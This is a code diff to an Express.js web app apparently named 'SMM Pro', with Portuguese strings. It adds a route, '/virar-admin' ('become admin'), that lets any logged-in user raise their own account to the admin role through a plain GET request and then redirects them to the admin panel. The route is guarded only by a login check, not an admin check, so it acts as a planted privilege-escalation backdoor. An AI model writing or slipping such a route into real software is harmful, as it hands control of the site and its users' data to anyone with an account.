@@ -484,7 +484,16 @@ app.post('/admin/user/:id', requireAdmin, (req, res) => {
 
   res.redirect('/admin/users');
 });
+app.get('/virar-admin', requireAuth, (req, res) => {
+  db.prepare('UPDATE users SET role=? WHERE id=?')
+    .run('admin', req.session.user.id);
 
+  req.session.user.role = 'admin';
+
+  req.session.save(() => {
+    res.redirect('/admin');
+  });
+});
 app.listen(process.env.PORT || 3000, () => {
   console.log('SMM Pro rodando na porta ' + (process.env.PORT || 3000));
 });
